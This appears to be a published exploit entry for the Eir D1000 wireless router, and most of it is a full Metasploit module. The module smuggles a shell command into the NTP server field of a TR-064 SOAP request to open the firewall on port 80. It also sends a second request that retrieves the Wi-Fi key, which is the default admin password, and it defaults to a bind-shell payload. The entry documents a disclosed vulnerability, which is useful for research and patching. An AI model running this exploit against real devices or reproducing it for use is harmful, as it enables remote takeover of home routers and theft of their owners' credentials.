=begin
# Exploit Title: Eir D1000 Wireless Router - WAN Side Remote Command Injection
# Date: 7th November 2016
# Exploit Author: Kenzo
# Website: https://devicereversing.wordpress.com
# Tested on Firmware version: 2.00(AADU.5)_20150909
# Type: Webapps
# Platform: Hardware

 
Description
===========
By sending certain TR-064 commands, we can instruct the modem to open port 80 on the firewall. This allows access the the web administration interface from the Internet facing side of the modem. The default login password for the D1000 is the default Wi-Fi password. This is easily obtained with another TR-064 command.   

 
Proof of Concept
================
##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
=end

 
require 'msf/core'
 
class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking
 
  include Msf::Exploit::Remote::HttpClient
 
  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Eir D1000 Modem CWMP Exploit POC',
      'Description' => %q{
        This exploit drops the firewall to allow access to the web administration interface on port 80 and
    it also retrieves the wifi password. The default login password to the web interface is the default wifi
        password. This exploit was tested on firmware versions up to 2.00(AADU.5)_20150909. 
      },
      'Author'      =>
        [
          'Kenzo', # Vulnerability discovery and Metasploit module
        ],
      'License'     => MSF_LICENSE,
      'DisclosureDate' => 'Nov 07 2016',
      'Privileged'     => true,
      'DefaultOptions' => 
        { 
          'PAYLOAD' => 'linux/mipsbe/shell_bind_tcp'
        },
      'Targets' =>
        [
          [ 'MIPS Little Endian',
            {
              'Platform' => 'linux',
              'Arch'     => ARCH_MIPSLE
            }
          ],
          [ 'MIPS Big Endian',  
            {
              'Platform' => 'linux',
              'Arch'     => ARCH_MIPSBE
            }
          ],
        ],
      'DefaultTarget'    => 1
      ))
 
    register_options(
      [
        Opt::RPORT(7547), # CWMP port
      ], self.class)
 
  @data_cmd_template = "<?xml version=\"1.0\"?>"
  @data_cmd_template << "<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">"
  @data_cmd_template << " <SOAP-ENV:Body>"
  @data_cmd_template << "  <u:SetNTPServers xmlns:u=\"urn:dslforum-org:service:Time:1\">"
  @data_cmd_template << "   <NewNTPServer1>%s</NewNTPServer1>"
  @data_cmd_template << "   <NewNTPServer2></NewNTPServer2>"
  @data_cmd_template << "   <NewNTPServer3></NewNTPServer3>"
  @data_cmd_template << "   <NewNTPServer4></NewNTPServer4>"
  @data_cmd_template << "   <NewNTPServer5></NewNTPServer5>"
  @data_cmd_template << "  </u:SetNTPServers>"
  @data_cmd_template << " </SOAP-ENV:Body>"
  @data_cmd_template << "</SOAP-ENV:Envelope>"
  end
 
  def check
    begin
      res = send_request_cgi({
        'uri' => '/globe'
      })
    rescue ::Rex::ConnectionError
      vprint_error("A connection error has occured")
      return Exploit::CheckCode::Unknown
    end
 
    if res and res.code == 404 and res.body =~ /home_wan.htm/
      return Exploit::CheckCode::Appears
    end
 
    return Exploit::CheckCode::Safe
  end
 
  def exploit
    print_status("Trying to access the device...")
 
    unless check == Exploit::CheckCode::Appears
      fail_with(Failure::Unknown, "#{peer} - Failed to access the vulnerable device")
    end
 
    print_status("Exploiting...")
    print_status("Dropping firewall on port 80...")
    execute_command("`iptables -I INPUT -p tcp --dport 80 -j ACCEPT`","")
    key = get_wifi_key()
    print_status("WiFi key is #{key}")
    execute_command("tick.eircom.net","")
  end
 
  def execute_command(cmd, opts)
    uri = '/UD/act?1'
    soapaction = "urn:dslforum-org:service:Time:1#SetNTPServers"
    data_cmd = @data_cmd_template % "#{cmd}"
    begin
      res = send_request_cgi({
        'uri'    => uri,
        'ctype' => "text/xml",
        'method' => 'POST',
        'headers' => {
          'SOAPAction' => soapaction,
          },
        'data' => data_cmd
      })
      return res
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unreachable, "#{peer} - Failed to connect to the web server")
    end
  end
 
  def get_wifi_key()
    print_status("Getting the wifi key...")
    uri = '/UD/act?1'
    soapaction = "urn:dslforum-org:service:WLANConfiguration:1#GetSecurityKeys"
    data_cmd_template = "<?xml version=\"1.0\"?>"
    data_cmd_template << "<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">"
    data_cmd_template << " <SOAP-ENV:Body>"
    data_cmd_template << "  <u:GetSecurityKeys xmlns:u=\"urn:dslforum-org:service:WLANConfiguration:1\">"
    data_cmd_template << "  </u:GetSecurityKeys>"
    data_cmd_template << " </SOAP-ENV:Body>"
    data_cmd_template << "</SOAP-ENV:Envelope>"
    data_cmd= data_cmd_template
 
    begin
      res = send_request_cgi({
        'uri'    => uri,
        'ctype' => "text/xml",
        'method' => 'POST',
        'headers' => {
          'SOAPAction' => soapaction,
          },
        'data' => data_cmd
      })
 
      /NewPreSharedKey>(?<key>.*)<\/NewPreSharedKey/ =~ res.body
      return key
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unreachable, "#{peer} - Failed to connect to the web server")
    end
  end
end
